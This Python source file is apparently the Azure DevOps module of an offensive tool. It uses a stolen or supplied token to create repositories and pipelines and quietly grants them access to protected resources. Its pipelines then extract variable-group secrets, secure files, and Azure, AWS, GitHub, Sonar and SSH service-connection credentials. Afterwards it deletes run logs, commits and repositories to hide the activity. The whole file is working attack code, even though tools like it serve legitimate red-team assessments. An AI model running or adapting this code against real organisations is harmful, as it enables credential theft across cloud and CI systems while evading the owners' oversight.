import logging
import subprocess
import time
from os import chdir, makedirs
from os.path import exists, realpath

from nordstream.git import Git
from nordstream.utils.errors import DevOpsError, GitError, RepoCreationError
from nordstream.utils.helpers import isAllowed
from nordstream.utils.log import logger
from nordstream.yaml.devops import DevOpsPipelineGenerator
from nordstream.parsers.devops import decode_double_b64, extract_github_authorization
from nordstream.core.base import BaseRunner
from nordstream.report.devops import (
    displayProject,
    displayRepository,
    displayUser,
    displayVariableGroup,
    displaySecureFile,
    displayServiceConnection,
    displayFailureReasons,
)


class DevOpsRunner(BaseRunner):
    # Service-connection / secret extraction toggles, set via parseExtractList().
    _extractVariableGroups = True
    _extractSecureFiles = True
    _extractAzureServiceconnections = True
    _extractGitHubServiceconnections = True
    _extractAWSServiceconnections = True
    _extractSonarServiceconnections = True
    _extractSSHServiceConnections = True
    _resType = {"default": 0, "doubleb64": 1, "github": 2, "azurerm": 3}
    _allowedTypes = ["azurerm", "github", "aws", "sonarqube", "ssh"]

    # Plain public config (set by the CLI).
    output = None
    poolName = None
    os = "linux"
    pipelineFilename = "azure-pipelines.yml"

    def __init__(self, cicd):
        super().__init__(cicd)
        self._createLogDir("azure_devops")

    def listDevOpsProjects(self):
        logger.info("Listing all projects:")
        for p in self._cicd.projects:
            displayProject(p.get("name"))

    def listDevOpsRepositories(self):
        logger.info("Listing all repositories:")
        for p in self._cicd.projects:
            project_name = p.get("name")
            for r in self._cicd.listRepositories(project_name):
                displayRepository(project_name, r.get("name"))

    def listDevOpsUsers(self):
        logger.info("Listing all users:")
        for p in self._cicd.listUsers():
            displayUser(p)

    def getProjects(self, project):
        if project:
            if exists(project):
                with open(project, "r") as file:
                    for project in file:
                        self._cicd.addProject(project.strip())

            else:
                self._cicd.addProject(project)
        else:
            self._cicd.listProjects()

        if self.writeAccessFilter:
            self._cicd.filterWriteProjects()

        if len(self._cicd.projects) == 0:
            if self.writeAccessFilter:
                logger.critical("No project with write access found.")
            else:
                logger.critical("No project found.")

    def listProjectSecrets(self):
        logger.info("Listing secrets")
        for project in self._cicd.projects:
            projectName = project.get("name")
            projectId = project.get("id")
            logger.info(f'"{projectName}" secrets')
            self.__displayProjectVariableGroupsSecrets(projectId)
            self.__displayProjectSecureFiles(projectId)
            self.__displayServiceConnections(projectId)
            logger.empty_line()

    def __displayProjectVariableGroupsSecrets(self, project):

        try:
            secrets = self._cicd.listProjectVariableGroupsSecrets(project)
        except DevOpsError as e:
            logger.error(e)

        else:
            if len(secrets) != 0:
                for variableGroup in secrets:
                    displayVariableGroup(variableGroup)

    def __displayProjectSecureFiles(self, project):

        try:
            secureFiles = self._cicd.listProjectSecureFiles(project)
        except DevOpsError as e:
            logger.error(e)
        else:
            if secureFiles:
                for sf in secureFiles:
                    displaySecureFile(sf)

    def __displayServiceConnections(self, projectId):

        try:
            serviceConnections = self._cicd.listServiceConnections(projectId)
        except DevOpsError as e:
            logger.error(e)
        else:
            if len(serviceConnections) != 0:
                logger.info("Service connections:")
                for sc in serviceConnections:
                    displayServiceConnection(sc)

    def __checkSecrets(self, project):
        projectId = project.get("id")
        projectName = project.get("name")
        secrets = 0

        if (
            self._extractAzureServiceconnections
            or self._extractGitHubServiceconnections
            or self._extractAWSServiceconnections
            or self._extractSonarServiceconnections
            or self._extractSSHServiceConnections
        ):

            try:
                secrets += len(self._cicd.listServiceConnections(projectId))
            except DevOpsError as e:
                logger.error(f"Error while listing service connection: {e}")

        if self._extractVariableGroups:

            try:
                secrets += len(self._cicd.listProjectVariableGroupsSecrets(projectId))
            except DevOpsError as e:
                logger.error(f"Error while listing variable groups: {e}")

        if self._extractSecureFiles:

            try:
                secrets += len(self._cicd.listProjectSecureFiles(projectId))
            except DevOpsError as e:
                logger.error(f"Error while listing secure files: {e}")

        if secrets == 0:
            logger.info(f'No secrets found for project "{projectName}" / "{projectId}"')
            return False
        return True

    def createYaml(self, pipelineType):
        pipelineGenerator = DevOpsPipelineGenerator()
        if pipelineType == "github":
            pipelineGenerator.generatePipelineForGitHub("#FIXME", self.poolName, self.os)
        elif pipelineType == "azurerm":
            pipelineGenerator.generatePipelineForAzureRm("#FIXME", self.poolName, self.os)
        elif pipelineType == "aws":
            pipelineGenerator.generatePipelineForAWS("#FIXME", self.poolName, self.os)
        elif pipelineType == "sonar":
            pipelineGenerator.generatePipelineForSonar("#FIXME", self.poolName, self.os)
        elif pipelineType == "ssh":
            pipelineGenerator.generatePipelineForSSH("#FIXME", self.poolName, self.os)
        else:
            pipelineGenerator.generatePipelineForSecretExtraction({"name": "", "variables": ""}, self.poolName, self.os)

        logger.success("YAML file: ")
        pipelineGenerator.displayYaml()
        pipelineGenerator.writeFile(self.output)

    def __extractPipelineOutput(self, projectId, resType=0, resultsFilename="secrets.txt"):
        with open(
            f"{self._cicd.outputDir}/{self._cicd.org}/{projectId}/{self._fileName}",
            "rb",
        ) as output:
            content = output.read()

        try:
            if resType == self._resType["doubleb64"]:
                pipelineResults = decode_double_b64(content)
            elif resType == self._resType["github"]:
                pipelineResults = extract_github_authorization(content)
            elif resType == self._resType["azurerm"]:
                pipelineResults = decode_double_b64(content)
            elif resType == self._resType["default"]:
                pipelineResults = content
            else:
                logger.exception("Invalid type checkout: _resType")
        except Exception:
            pipelineResults = content

        logger.success("Output:")
        logger.raw(pipelineResults, logging.INFO)

        with open(f"{self._cicd.outputDir}/{self._cicd.org}/{projectId}/{resultsFilename}", "ab") as file:
            file.write(pipelineResults)

    def __launchPipeline(self, project, pipelineId, pipelineGenerator):
        logger.verbose(f"Launching pipeline.")

        pipelineGenerator.writeFile(f"./{self.pipelineFilename}")

        try:
            if self._pushCode():
                # manual trigger because otherwise is difficult to get the right runId
                run = self._cicd.runPipeline(project, pipelineId)

                self.__checkRunErrors(run)

                runId = run.get("id")
                pipelineStatus = self._cicd.waitPipeline(project, pipelineId, runId)

                if pipelineStatus == "succeeded":
                    logger.success("Pipeline has successfully terminated.")
                    return runId

                elif pipelineStatus == "failed":
                    self.__displayFailureReasons(project, runId)
                    return None

        except Exception as e:
            logger.error(e)
        finally:
            pass

    def __displayFailureReasons(self, projectId, runId):
        displayFailureReasons(self._cicd.getFailureReason(projectId, runId))

    def __extractVariableGroupsSecrets(self, projectId, pipelineId):
        logger.verbose(f"Getting variable groups secrets")

        try:
            variableGroups = self._cicd.listProjectVariableGroupsSecrets(projectId)
        except DevOpsError as e:
            logger.error(e)

        else:
            if len(variableGroups) > 0:
                for variableGroup in variableGroups:
                    pipelineGenerator = DevOpsPipelineGenerator()
                    pipelineGenerator.generatePipelineForSecretExtraction(variableGroup, self.poolName, self.os)

                    logger.verbose(
                        f'Checking (and modifying) pipeline permissions for variable group: "{variableGroup["name"]}"'
                    )
                    if not self._cicd.authorizePipelineForResourceAccess(
                        projectId, pipelineId, variableGroup, "variablegroup"
                    ):
                        continue

                    variableGroupName = variableGroup.get("name")

                    logger.info(f'Extracting secrets for variable group: "{variableGroupName}"')
                    runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
                    if runId:
                        self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
                        if self._fileName:
                            self.__extractPipelineOutput(projectId, self._resType["doubleb64"])

                        logger.empty_line()

            else:
                logger.info("No variable groups found")

    def __extractSecureFiles(self, projectId, pipelineId):
        logger.verbose(f"Getting secure files")

        try:
            secureFiles = self._cicd.listProjectSecureFiles(projectId)
        except DevOpsError as e:
            logger.error(e)

        else:
            if secureFiles:
                for secureFile in secureFiles:
                    pipelineGenerator = DevOpsPipelineGenerator()
                    pipelineGenerator.generatePipelineForSecureFileExtraction(secureFile["name"], self.poolName)

                    logger.verbose(
                        f'Checking (and modifying) pipeline permissions for the secure file: "{secureFile["name"]}"'
                    )
                    if not self._cicd.authorizePipelineForResourceAccess(
                        projectId, pipelineId, secureFile, "securefile"
                    ):
                        continue

                    logger.info(f'Extracting secure file: "{secureFile["name"]}"')
                    runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
                    if runId:
                        self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
                        if self._fileName:
                            date = time.strftime("%Y-%m-%d_%H-%M-%S")
                            safeSecureFilename = "".join(
                                [c for c in secureFile["name"] if c.isalpha() or c.isdigit() or c in (" ", ".")]
                            ).strip()
                            self.__extractPipelineOutput(
                                projectId,
                                self._resType["doubleb64"],
                                f"pipeline_{date}_secure_file_{safeSecureFilename}",
                            )

                        logger.empty_line()
            else:
                logger.info("No secure files found")

    def __extractGitHubSecrets(self, projectId, pipelineId, sc):
        endpoint = sc.get("name")

        pipelineGenerator = DevOpsPipelineGenerator()
        pipelineGenerator.generatePipelineForGitHub(endpoint, self.poolName, self.os)

        logger.info(f'Extracting secrets for GitHub: "{endpoint}"')
        runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
        if runId:
            self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
            if self._fileName:
                self.__extractPipelineOutput(projectId, self._resType["github"])

        logger.empty_line()

    def __extractAzureRMSecrets(self, projectId, pipelineId, sc):

        scheme = sc.get("authorization").get("scheme").lower()
        if scheme == "serviceprincipal":
            name = sc.get("name")
            pipelineGenerator = DevOpsPipelineGenerator()
            pipelineGenerator.generatePipelineForAzureRm(name, self.poolName, self.os)

            logger.info(f'Extracting secrets for AzureRM: "{name}"')
            runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
            if runId:
                self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
                if self._fileName:
                    self.__extractPipelineOutput(projectId, self._resType["azurerm"])

                logger.empty_line()
        else:
            logger.error(f"Unsupported scheme: {scheme}")

    def __extractAWSSecrets(self, projectId, pipelineId, sc):

        scheme = sc.get("authorization").get("scheme").lower()
        if scheme == "usernamepassword":

            name = sc.get("name")

            pipelineGenerator = DevOpsPipelineGenerator()
            pipelineGenerator.generatePipelineForAWS(name, self.poolName, self.os)

            logger.info(f'Extracting secrets for AWS: "{name}"')
            runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
            if runId:
                self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
                if self._fileName:
                    self.__extractPipelineOutput(projectId, self._resType["doubleb64"])

                logger.empty_line()
        else:
            logger.error(f"Unsupported scheme: {scheme}")

    def __extractSonarSecrets(self, projectId, pipelineId, sc):
        endpoint = sc.get("name")

        pipelineGenerator = DevOpsPipelineGenerator()
        pipelineGenerator.generatePipelineForSonar(endpoint, self.poolName, self.os)

        logger.info(f'Extracting secrets for Sonar: "{endpoint}"')
        runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
        if runId:
            self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
            if self._fileName:
                self.__extractPipelineOutput(projectId, self._resType["doubleb64"])

        logger.empty_line()

    def __extractSSHSecrets(self, projectId, pipelineId, sc):
        endpoint = sc.get("name")

        pipelineGenerator = DevOpsPipelineGenerator()
        pipelineGenerator.generatePipelineForSSH(endpoint, self.poolName, self.os)

        logger.info(f'Extracting secrets for ssh: "{endpoint}"')
        runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
        if runId:
            self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
            if self._fileName:
                self.__extractPipelineOutput(projectId, self._resType["doubleb64"])

        logger.empty_line()

    def __extractServiceConnectionsSecrets(self, projectId, pipelineId):

        try:
            serviceConnections = self._cicd.listServiceConnections(projectId)
        except DevOpsError as e:
            logger.error(e)
        else:
            for sc in serviceConnections:

                scType = sc.get("type").lower()

                if scType in self._allowedTypes:
                    logger.verbose(
                        f'Checking (and modifying) pipeline permissions for the service connection: "{sc["name"]}"'
                    )
                    if not self._cicd.authorizePipelineForResourceAccess(projectId, pipelineId, sc, "endpoint"):
                        continue

                    if self._extractAzureServiceconnections and scType == "azurerm":
                        self.__extractAzureRMSecrets(projectId, pipelineId, sc)
                    elif self._extractGitHubServiceconnections and scType == "github":
                        self.__extractGitHubSecrets(projectId, pipelineId, sc)
                    elif self._extractAWSServiceconnections and scType == "aws":
                        self.__extractAWSSecrets(projectId, pipelineId, sc)
                    elif self._extractSonarServiceconnections and scType == "sonarqube":
                        self.__extractSonarSecrets(projectId, pipelineId, sc)
                    elif self._extractSSHServiceConnections and scType == "ssh":
                        self.__extractSSHSecrets(projectId, pipelineId, sc)

    def manualCleanLogs(self):
        logger.info("Deleting logs")
        for project in self._cicd.projects:
            projectId = project.get("id")
            logger.info(f"Cleaning logs for project: {projectId}")
            self._cicd.cleanAllLogs(projectId)

    def __runSecretsExtractionPipeline(self, projectId, pipelineId):
        if self._extractVariableGroups:
            self.__extractVariableGroupsSecrets(projectId, pipelineId)

        if self._extractSecureFiles:
            self.__extractSecureFiles(projectId, pipelineId)

        if (
            self._extractAzureServiceconnections
            or self._extractGitHubServiceconnections
            or self._extractAWSServiceconnections
            or self._extractSonarServiceconnections
            or self._extractSSHServiceConnections
        ):
            self.__extractServiceConnectionsSecrets(projectId, pipelineId)

    def __pushEmptyFile(self):
        Git.gitCreateDummyFile("README.md")
        diffOutput = Git.gitDiffFile("README.md")
        stdout, stderr = diffOutput.communicate()
        if stdout == b"":
            logger.verbose(f"README.md file not modified.")
        else:
            logger.verbose(f"README.md file is modified, incrementing commit count.")
            self._pushedCommitsCount += 1

        pushOutput = Git.gitPush(self._cicd.branchName)
        pushOutput.wait()

        try:
            if pushOutput.returncode != 0:
                logger.error("Error when pushing code:")
                logger.raw(pushOutput.communicate()[1], logging.INFO)
            else:
                logger.raw(pushOutput.communicate()[1])

        except Exception as e:
            logger.exception(e)

    def __createRemoteRepo(self, projectId):
        repo = self._cicd.createGit(projectId)
        if repo.get("id"):
            repoId = repo.get("id")
            logger.info(f'New remote repository created: "{self._cicd.repoName}" / "{repoId}"')
            return repo
        else:
            return None

    def __getRemoteRepo(self, projectId):
        for repo in self._cicd.listRepositories(projectId):
            if self._cicd.repoName == repo.get("name"):
                return repo, False

        repo = self.__createRemoteRepo(projectId)
        if repo != None:
            return repo, True

        raise RepoCreationError("No repo found")

    def __clean(self, projectId, repoId, deleteRemoteRepo, deleteRemotePipeline):
        if self.cleanLogs:
            if deleteRemotePipeline:
                logger.verbose("Deleting remote pipeline.")
                self._cicd.deletePipeline(projectId)

        if deleteRemoteRepo:
            logger.verbose("Deleting remote repository.")
            self._cicd.deleteGit(projectId, repoId)

        else:
            if self._pushedCommitsCount > 0:

                if self.cleanLogs:
                    logger.info(f"Cleaning logs for project: {projectId}")
                    self._cicd.cleanAllLogs(projectId)

                logger.verbose("Cleaning commits.")
                if self._branchAlreadyExists and self._cicd.branchName != self._cicd.defaultBranchName:
                    Git.gitUndoLastPushedCommits(self._cicd.branchName, self._pushedCommitsCount)
                else:
                    if not self._deleteRemoteBranch():
                        logger.info("Cleaning remote branch.")
                        # rm everything if we can't delete the branch (only leave one file otherwise it will try to rm the branch)
                        Git.gitCleanRemote(self._cicd.branchName, leaveOneFile=True)

    def __createPipeline(self, projectId, repoId):
        logger.info("Getting pipeline")
        self.__pushEmptyFile()

        for pipeline in self._cicd.listPipelines(projectId):
            if pipeline.get("name") == self._cicd.pipelineName:
                return pipeline.get("id"), False

        pipelineId = self._cicd.createPipeline(projectId, repoId, f"{self.pipelineFilename}")
        if pipelineId:
            return pipelineId, True
        else:
            raise Exception("unable to create a pipeline")

    def __runCustomPipeline(self, projectId, pipelineId):
        pipelineGenerator = DevOpsPipelineGenerator()
        pipelineGenerator.loadFile(self._yaml)

        logger.info("Running arbitrary pipeline")
        runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
        if runId:
            self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
            if self._fileName:
                self.__extractPipelineOutput(projectId)

            logger.empty_line()

    def runPipeline(self):
        for project in self._cicd.projects:
            projectId = project.get("id")
            repoId = None
            deleteRemoteRepo = False
            deleteRemotePipeline = False

            # skip if no secrets
            if not self._yaml:
                if not self.__checkSecrets(project):
                    continue

            try:
                # Create or get first repo of the project
                repo, deleteRemoteRepo = self.__getRemoteRepo(projectId)
                repoId = repo.get("id")
                self._cicd.repoName = repo.get("name")
                logger.info(f'Getting remote repository: "{self._cicd.repoName}" /' f' "{repoId}"')

                url = f"https://foo:{self._cicd.token}@dev.azure.com/{self._cicd.org}/{projectId}/_git/{self._cicd.repoName}"

                if not Git.gitClone(url):
                    raise GitError("Fail to clone the repository")

                chdir(self._cicd.repoName)

                self._branchAlreadyExists = Git.gitRemoteBranchExists(self._cicd.branchName)
                Git.gitInitialization(self._cicd.branchName, branchAlreadyExists=self._branchAlreadyExists)

                pipelineId, deleteRemotePipeline = self.__createPipeline(projectId, repoId)

                if self._yaml:
                    self.__runCustomPipeline(projectId, pipelineId)
                else:
                    self.__runSecretsExtractionPipeline(projectId, pipelineId)

            except (GitError, RepoCreationError) as e:
                name = project.get("name")
                logger.error(f"Error in project {name}: {e}")

            except KeyboardInterrupt:
                self.__clean(projectId, repoId, deleteRemoteRepo, deleteRemotePipeline)
                chdir("../")
                subprocess.Popen(f"rm -rfd ./{self._cicd.repoName}", shell=True).wait()

            except Exception as e:
                logger.error(f"Error during pipeline run: {e}")
                if logger.getEffectiveLevel() == logging.DEBUG:
                    logger.exception(e)

                self.__clean(projectId, repoId, deleteRemoteRepo, deleteRemotePipeline)
                chdir("../")
                subprocess.Popen(f"rm -rfd ./{self._cicd.repoName}", shell=True).wait()

            else:
                self.__clean(projectId, repoId, deleteRemoteRepo, deleteRemotePipeline)
                chdir("../")
                subprocess.Popen(f"rm -rfd ./{self._cicd.repoName}", shell=True).wait()

    def describeToken(self):
        response = self._cicd.getUser()
        logger.info("Token information:")

        username = response.get("authenticatedUser").get("properties").get("Account").get("$value")
        if username != "":
            logger.raw(f"\t- Username: {username}\n", logging.INFO)

        id = response.get("authenticatedUser").get("id")
        if id != "":
            logger.raw(f"\t- Id: {id}\n", logging.INFO)

    def __checkRunErrors(self, run):
        if run.get("customProperties") != None:
            validationResults = run.get("customProperties").get("ValidationResults", [])

            msg = ""
            for res in validationResults:
                if res.get("result", "") == "error":

                    if "Verify the name and credentials being used" in res.get("message", ""):
                        raise DevOpsError("The stored token is not valid anymore.")

                    msg += res.get("message", "") + "\n"

            raise DevOpsError(msg)

    def parseExtractList(self, extractList, allow=True):

        extractList = extractList.split(",") if extractList else []

        self._extractVariableGroups = isAllowed("vg", extractList, allow)
        self._extractSecureFiles = isAllowed("sf", extractList, allow)
        self._extractAzureServiceconnections = isAllowed("az", extractList, allow)
        self._extractGitHubServiceconnections = isAllowed("gh", extractList, allow)
        self._extractAWSServiceconnections = isAllowed("aws", extractList, allow)
        self._extractSonarServiceconnections = isAllowed("sonar", extractList, allow)
        self._extractSSHServiceConnections = isAllowed("ssh", extractList, allow)
